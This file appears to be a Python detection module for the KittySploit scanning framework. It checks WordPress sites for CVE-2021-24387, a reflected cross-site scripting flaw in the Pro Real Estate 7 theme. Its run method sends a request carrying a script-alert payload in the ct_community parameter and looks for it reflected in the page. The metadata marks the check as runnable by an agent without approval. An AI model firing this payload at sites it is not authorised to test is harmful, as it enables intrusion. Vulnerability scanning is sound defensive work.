#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Pro Real Estate 7 theme before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Pro Real Estate 7 Theme <3.1.1 - Cross-Site Scripting Detection',
        'description': 'WordPress Pro Real Estate 7 theme before 3.1.1 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the ct_community parameter in its search listing page before outputting it back.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'xss', 'wordpress', 'wpscan', 'contempothemes', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://cxsecurity.com/issue/WLB-2021070041',
            'https://wpscan.com/vulnerability/27264f30-71d5-4d2b-8f36-4009a2be6745',
            'https://contempothemes.com/wp-real-estate-7/changelog/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24387',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-24387',
    }

    def run(self):
        path = '/?ct_mobile_keyword&ct_keyword&ct_city&ct_zipcode&search-listings=true&ct_price_from&ct_price_to&ct_beds_plus&ct_baths_plus&ct_sqft_from&ct_sqft_to&ct_lotsize_from&ct_lotsize_to&ct_year_from&ct_year_to&ct_community=%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&ct_mls&ct_brokerage=0&lat&lng'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<script>alert(document.domain);</script>', '/wp-content/themes/realestate',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='WordPress Pro Real Estate 7 Theme <3.1.1 - Cross-Site Scripting detected', path=path)
            return True
        return False

